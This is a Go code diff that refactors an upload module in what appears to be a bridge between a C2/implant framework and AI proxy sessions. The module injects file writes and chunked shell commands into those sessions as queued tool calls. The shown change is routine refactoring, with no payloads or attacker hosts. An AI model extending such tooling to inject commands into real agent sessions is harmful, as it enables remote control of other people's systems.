@@ -1,8 +1,6 @@
 package bridge
 
 import (
-	"time"
-
 	"github.com/chainreactors/IoM-go/consts"
 	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
 	"github.com/router-for-me/CLIProxyAPI/v6/internal/sessions"
@@ -16,8 +14,6 @@ type UploadModule struct{}
 func (m *UploadModule) Name() string { return consts.ModuleUpload }
 
 func (m *UploadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32, spite *implantpb.Spite) {
-	ctx.Tasks.Create(sessionID, taskID, m.Name())
-
 	uReq := spite.GetUploadRequest()
 	if uReq == nil {
 		ctx.SendSpite(sessionID, taskID, execSpite("missing UploadRequest"))
@@ -25,7 +21,7 @@ func (m *UploadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32
 		return
 	}
 
-	sess := ctx.WaitForSession(sessionID, 30*time.Second)
+	sess := ctx.WaitForSession(sessionID, DefaultSessionTimeout)
 	if sess == nil {
 		log.Warnf("[bridge] session %s not found for upload injection", sessionID)
 		ctx.Tasks.Fail(sessionID, taskID, "session not found")
@@ -71,27 +67,11 @@ func (m *UploadModule) Handle(ctx ModuleContext, sessionID string, taskID uint32
 
 func (m *UploadModule) handleDirectUpload(ctx ModuleContext, sessionID string, taskID uint32, sess *sessions.Session, toolName string, req *implantpb.UploadRequest) {
 	args := sessions.BuildWriteArguments(sess, toolName, req.Target, string(req.Data))
-	cmdID := sessions.GenerateCommandID()
-
-	action := &sessions.PendingAction{
-		ID:        cmdID,
-		TaskID:    taskID,
-		Type:      sessions.ActionToolCall,
-		ToolName:  toolName,
-		Arguments: args,
-		CreatedAt: time.Now(),
-	}
-
-	if !sessions.Global().EnqueueAction(sessionID, action) {
-		log.Errorf("[bridge] failed to enqueue direct upload for session %s", sessionID)
-		ctx.Tasks.Fail(sessionID, taskID, "enqueue failed")
+	if _, ok := enqueueToolAction(ctx, sessionID, taskID, toolName, args); !ok {
 		return
 	}
-
-	ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
 	log.Infof("[bridge] enqueued direct upload task %d for session %s: %s", taskID, sessionID, req.Target)
 
-	// Wait for result.
 	ch := ctx.Tasks.AwaitResult(sessionID, taskID)
 	if ch == nil {
 		ctx.Tasks.Fail(sessionID, taskID, "await failed")
@@ -115,24 +95,11 @@ func (m *UploadModule) executeChunks(ctx ModuleContext, sessionID string, taskID
 	}
 
 	for i, chunk := range chunks {
-		cmdID := sessions.GenerateCommandID()
-		action := &sessions.PendingAction{
-			ID:        cmdID,
-			TaskID:    taskID,
-			Type:      sessions.ActionToolCall,
-			ToolName:  shellTool,
-			Arguments: sessions.BuildCommandArguments(sess, shellTool, chunk.Command),
-			CreatedAt: time.Now(),
-		}
-
-		if !sessions.Global().EnqueueAction(sessionID, action) {
-			log.Errorf("[bridge] failed to enqueue upload chunk %d/%d for session %s", i+1, len(chunks), sessionID)
+		args := sessions.BuildCommandArguments(sess, shellTool, chunk.Command)
+		if _, ok := enqueueToolAction(ctx, sessionID, taskID, shellTool, args); !ok {
 			sendUploadACK(ctx, sessionID, taskID, false)
-			ctx.Tasks.Fail(sessionID, taskID, "chunk enqueue failed")
 			return
 		}
-
-		ctx.Tasks.BindCommand(sessionID, taskID, cmdID)
 		log.Infof("[bridge] enqueued upload chunk %d/%d for session %s", i+1, len(chunks), sessionID)
 
 		// Wait for this chunk's result before enqueuing the next.
